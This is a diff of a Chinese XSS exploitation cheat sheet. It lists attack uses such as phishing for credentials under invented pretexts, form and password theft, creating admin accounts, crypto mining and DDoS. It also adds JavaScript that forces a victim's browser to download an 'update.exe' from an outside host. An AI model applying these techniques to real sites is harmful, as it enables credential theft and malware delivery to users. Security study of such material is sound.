@@ -395,19 +395,20 @@ XSS proxy - 与XSS受害者的浏览器实时交互.  工具 [JShell](https://gi
    * 2.利用自身/兄弟/父子域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制是后端通过判断Referer的值，如果Referer的值 是自身/兄弟/父子域名下的url 就是"合法"请求
 * 漏洞联合 - 通过已有的CSRF漏洞 利用self-XSS漏洞(变废为宝)
   * 利用过程 - 事实上self-XSS漏洞无法直接使对方触发，然而通过已有的CSRF漏洞构造"触发该self-XSS漏洞的"请求，对方触发CSRF漏洞即触发XSS漏洞
-* 构造钓鱼页面
-  * 窃取各种凭证(编造理由 "WiFi固件更新，请重新输入您的凭据以进行身份验证" "重新登录域账号")
-  * 诱导下载(编造理由 "xx程序必须更新才能使用")
-* 污染页面内容 - 直接修改页面内容为恶意内容. 如 广告(利用存储型XSS漏洞实现Ad-Jacking) 诋毁 等
-* 获取表单输入 - 窃取表单输入框的内容(如口令输入框)
-* 获取前端代码 - 如管理员后台系统的前端代码中 有对应的字段名 可根据代码构造请求 以构造请求 新增管理员账号
-* 重定向 - Redirecting
+* 获取网页截图 - (HTML5) html2canvas
+* 获取前端代码 - 如 得到管理员后台系统的前端代码(可根据表单字段名构造并发出异步请求 实现新增管理员账号)
+* 钓鱼 - 获取各种凭证(编造理由 "WiFi固件更新，请重新输入您的凭据以进行身份验证" "重新登录域账号")
+* 钓鱼 - 自动下载文件 诱导执行可执行文件(编造理由 "xx程序必须更新才能使用")
+* 修改页面内容 - 如 广告(利用存储型XSS漏洞实现Ad-Jacking) 等
 * 虚拟币挖矿 - 利用javascript实现Crypto Mining
+* 获取表单输入 - 窃取表单输入框的内容(如口令输入框)
+* 重定向 - Redirecting
 * DOS攻击 - 利用javascript发起注销请求 使用户cookie失效从而无法登录 严重影响业务
 * DDoS攻击 - 对其他站点进行应用层DDoS攻击 如持续发送HTTP请求
-* 获取浏览器信息 - 获取浏览器名称及版本 已安装的插件及版本
-* 获取系统信息 - 系统类型 语言 屏幕分辨率
-* 获取网页截图 - (HTML5) html2canvas
+* 获取系统和浏览器信息
+  * 操作系统类型、版本  浏览器类型、版本 (根据User-agent获取)
+  * 屏幕分辨率 (高度`window.screen.height;` 宽度`window.screen.width;`)
+  * 语言
 * 获取录音数据 - (HTML5) 需要授权 Recording Audio
 * 获取摄像数据 - (HTML5) 需要授权 webcam
 * 获取地理位置 - (HTML5) 需要授权 访问受害者的Geo-location
@@ -453,6 +454,36 @@ for(var i = 0; i < localStorage.length; i++)
 
 // localStorage.key方法  查看第 3 条 key-value对
 localStorage.key(3);
+```
+
+
+#### XSS利用方式 - 自动下载文件
+
+* 同域 - 如果在域`a.com`下载同域的文件,则无需考虑跨域.
+* 非同域 - 如果在域`a.com`下载非同域`file.io`的文件,需要"跨域",可设置`https://file.io/`的CORS策略,允许来自域`a.com`的跨域请求.
+
+在`a.com`下 自动下载文件 方式1:
+
+```html
+<a href="https://down.file.io/test" download="update.exe" id="downit"></a>
+```
+
+```
+document.querySelectorAll("#downit")[0].click();
+```
+
+在`a.com`下 自动下载文件 方式2: 使用`fetch API`和`Blob(Binary large object)`对象
+
+```
+fetch('https://file.io/test').then(res => res.blob().then(blob => {
+    var a = document.createElement('a');
+    var url = window.URL.createObjectURL(blob);
+    var filename = 'myfile.zip';
+    a.href = url;
+    a.download = filename;
+    a.click();
+    window.URL.revokeObjectURL(url);
+}))
 ```
 
 #### XSS利用方式 - 读取本地文件
